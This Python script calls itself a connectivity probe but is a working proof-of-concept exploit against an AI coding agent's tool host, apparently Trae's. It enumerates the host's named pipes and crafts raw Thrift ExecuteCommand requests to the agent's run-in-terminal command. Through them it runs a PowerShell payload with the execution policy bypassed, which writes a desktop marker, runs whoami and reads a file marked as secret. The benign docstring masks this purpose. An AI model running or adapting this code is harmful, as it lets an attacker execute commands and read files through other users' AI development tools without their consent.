#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Local tool-host connectivity probe for win-devkit."""
from __future__ import annotations

import argparse
import ctypes
import json
import os
import re
import struct
import subprocess
import sys
import time
from ctypes import wintypes
from pathlib import Path

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 3
INVALID = ctypes.c_void_p(-1).value
FILE_ATTRIBUTE_NORMAL = 0x80
FIND_FAILED = ctypes.c_void_p(-1).value

k32 = ctypes.windll.kernel32
k32.CreateFileW.restype = ctypes.c_void_p
k32.FindFirstFileW.restype = ctypes.c_void_p

READ_FILE = r"C:\Users\1\.config\1.txt"
CMD_ID = "icube.common.commands.tooling.runCommandInTerminal"
PIPE_RE = re.compile(r"^agent-code-toolhost-\d+-[0-9a-fA-F]+$")


class WIN32_FIND_DATAW(ctypes.Structure):
    _fields_ = [
        ("dwFileAttributes", wintypes.DWORD),
        ("ftCreationTime", wintypes.FILETIME),
        ("ftLastAccessTime", wintypes.FILETIME),
        ("ftLastWriteTime", wintypes.FILETIME),
        ("nFileSizeHigh", wintypes.DWORD),
        ("nFileSizeLow", wintypes.DWORD),
        ("dwReserved0", wintypes.DWORD),
        ("dwReserved1", wintypes.DWORD),
        ("cFileName", wintypes.WCHAR * 260),
        ("cAlternateFileName", wintypes.WCHAR * 14),
    ]


def w32(v: int) -> bytes:
    return struct.pack(">I", v & 0xFFFFFFFF)


def w16(v: int) -> bytes:
    return struct.pack(">H", v & 0xFFFF)


def ws(s: str) -> bytes:
    b = s.encode("utf-8")
    return w32(len(b)) + b


def thrift_exec(session_id: str, command: str) -> bytes:
    args_json = json.dumps({"command": command}, separators=(",", ":"), ensure_ascii=False)
    body = bytes([11]) + w16(1) + ws(session_id)
    body += bytes([11]) + w16(2) + ws(CMD_ID)
    body += bytes([15]) + w16(3) + bytes([11]) + w32(1) + ws(args_json)
    body += bytes([0])
    return w32(0x80010001) + ws("ExecuteCommand") + w32(1) + bytes([12]) + w16(1) + body + bytes([0])


def list_host_pipes_findfirst() -> list[str]:
    names: list[str] = []
    data = WIN32_FIND_DATAW()
    h = k32.FindFirstFileW("\\\\.\\pipe\\agent-code-toolhost-*", ctypes.byref(data))
    if h in (None, 0, FIND_FAILED):
        return names
    try:
        while True:
            n = data.cFileName
            if n and PIPE_RE.match(n):
                names.append(n)
            if not k32.FindNextFileW(ctypes.c_void_p(h), ctypes.byref(data)):
                break
    finally:
        k32.FindClose(ctypes.c_void_p(h))
    return names


def list_host_pipes_ps() -> list[str]:
    try:
        out = subprocess.check_output(
            [
                "powershell",
                "-NoProfile",
                "-Command",
                "(Get-ChildItem \\\\.\\pipe\\ -EA SilentlyContinue | "
                "? { $_.Name -like 'agent-code-toolhost-*' }).Name",
            ],
            text=True,
            errors="ignore",
            timeout=15,
        )
        return [x.strip() for x in out.splitlines() if x.strip() and PIPE_RE.match(x.strip())]
    except Exception:
        return []


def seed_pipes() -> list[str]:
    paths = [
        Path(os.environ.get("TEMP", ".")) / "trae-pathb" / "host_pipe.txt",
        Path(os.environ.get("TEMP", ".")) / "win-devkit" / "host_pipe.txt",
        Path.cwd() / ".trae" / "host_pipe.txt",
    ]
    out: list[str] = []
    for p in paths:
        if not p.exists():
            continue
        for ln in p.read_text(errors="ignore").splitlines():
            t = ln.strip()
            if PIPE_RE.match(t):
                out.append(t)
    return out


def collect_pipes() -> list[str]:
    seen: list[str] = []
    for src in (list_host_pipes_findfirst(), list_host_pipes_ps(), seed_pipes()):
        for n in src:
            if n not in seen:
                seen.append(n)
    return seen


def exchange(pipe: str, req: bytes) -> bytes | None:
    h = k32.CreateFileW(
        "\\\\.\\pipe\\" + pipe, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None
    )
    if h in (None, 0, INVALID):
        return None
    try:
        n = wintypes.DWORD()
        buf = ctypes.create_string_buffer(req)
        if not k32.WriteFile(ctypes.c_void_p(h), buf, len(req), ctypes.byref(n), None):
            return None
        avail = wintypes.DWORD()
        for _ in range(160):
            if k32.PeekNamedPipe(ctypes.c_void_p(h), None, 0, None, ctypes.byref(avail), None) and avail.value:
                break
            time.sleep(0.05)
        out = ctypes.create_string_buffer(400000)
        n = wintypes.DWORD()
        if not k32.ReadFile(ctypes.c_void_p(h), out, len(out), ctypes.byref(n), None):
            return None
        return out.raw[: n.value]
    finally:
        k32.CloseHandle(ctypes.c_void_p(h))


def wait_job(resp: bytes):
    text = resp.decode("latin1", "ignore")
    i = text.find("job-")
    if i < 0:
        return None, "", ""
    j = i
    while j < len(text) and (text[j].isalnum() or text[j] == "-"):
        j += 1
    job = text[i:j]
    base = Path(os.environ["TEMP"]) / "trae-agent-toolhost" / "jobs" / job
    st, lg = base / "state.json", base / "output.log"
    state = ""
    for _ in range(400):
        if st.exists():
            state = st.read_text(errors="ignore")
            if "Exited" in state or "Failed" in state:
                break
        time.sleep(0.1)
    log = lg.read_text(errors="ignore") if lg.exists() else ""
    return job, state, log


def desktop_dir() -> Path:
    try:
        out = subprocess.check_output(
            ["powershell", "-NoProfile", "-Command", "[Environment]::GetFolderPath('Desktop')"],
            text=True,
            errors="ignore",
            timeout=10,
        ).strip()
        if out:
            return Path(out)
    except Exception:
        pass
    return Path(os.environ["USERPROFILE"]) / "Desktop"


def ensure_read_file() -> Path:
    p = Path(READ_FILE)
    p.parent.mkdir(parents=True, exist_ok=True)
    if not p.exists():
        p.write_text(
            f"SECRET_MARKER_CONFIG_1 content={time.strftime('%Y-%m-%dT%H:%M:%S')}\n",
            encoding="utf-8",
        )
    return p


def build_payload(tag: str, marker: Path, read_file: Path) -> str:
    m = str(marker).replace("'", "''")
    r = str(read_file).replace("'", "''")
    return (
        "powershell -NoProfile -ExecutionPolicy Bypass -Command "
        f"\"Set-Content -LiteralPath '{m}' -Value 'WIN_DEVKIT_OK {tag}' -Encoding UTF8; "
        f"Write-Output ('WRITE_EXISTS=' + (Test-Path -LiteralPath '{m}')); "
        f"Write-Output '=== whoami ==='; whoami; "
        f"Write-Output '=== read_config_1 ==='; "
        f"if (Test-Path -LiteralPath '{r}') {{ Get-Content -LiteralPath '{r}' -Raw }} "
        f"else {{ 'MISSING_FILE' }}\""
    )


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--tag", default="WDK_" + time.strftime("%Y%m%d_%H%M%S"))
    args = ap.parse_args()
    tag = args.tag

    read_file = ensure_read_file()
    desk = desktop_dir()
    marker = desk / f"win_devkit_ok_{tag}.txt"

    pipes = collect_pipes()
    seed_dir = Path(os.environ.get("TEMP", ".")) / "trae-pathb"
    seed_dir.mkdir(parents=True, exist_ok=True)
    if pipes:
        (seed_dir / "host_pipe.txt").write_text("\n".join(pipes) + "\n", encoding="utf-8")

    print(f"tag={tag}")
    print(f"user={os.environ.get('USERDOMAIN','')}\\{os.environ.get('USERNAME','')}")
    print(f"desk_target={marker}")
    print(f"host_pipes={','.join(pipes)}")

    if not pipes:
        print("ERROR=no_host_pipe_found")
        print("HOST_CONNECT=FAIL")
        print("SUCCESS=False")
        return 2

    cmd = build_payload(tag, marker, read_file)
    last_log = ""
    ok = False
    used = ""
    for pipe in pipes:
        print(f"try_host={pipe}")
        resp = exchange(pipe, thrift_exec(f"win-devkit-{tag}", cmd))
        if not resp:
            print(f"exchange_fail={pipe}")
            continue
        job, state, log = wait_job(resp)
        print(f"job={job}")
        print(f"resp_len={len(resp)}")
        print("----log----")
        print((log or "")[:2000])
        last_log = log or ""
        used = pipe
        if marker.exists() or "WRITE_EXISTS=True" in (log or ""):
            ok = True
            break

    extracted = ""
    if "=== read_config_1 ===" in last_log:
        extracted = last_log.split("=== read_config_1 ===", 1)[1].strip()
    # also accept direct content if job log is sparse
    if not extracted and "SECRET_MARKER" in last_log:
        for ln in last_log.splitlines():
            if "SECRET_MARKER" in ln:
                extracted = ln.strip()
                break

    print("READ_FILE_PATH=" + str(read_file))
    print("READ_CONTENT_FROM_HOST=")
    print(extracted if extracted else "<empty>")
    print(f"used_pipe={used}")
    print(f"HOST_CONNECT={'OK' if ok or used else 'FAIL'}")
    print(f"DESK_MARKER={marker.exists()}")
    print(f"DESK_PATH={marker}")
    if marker.exists():
        print("DESK_CONTENT=" + marker.read_text(errors="ignore").strip())
    print(f"READ_OK={bool(extracted) and 'MISSING' not in extracted[:20]}")
    success = marker.exists() and bool(extracted) and "MISSING" not in extracted[:20]
    print(f"SUCCESS={success}")
    return 0 if success else 1


if __name__ == "__main__":
    raise SystemExit(main())
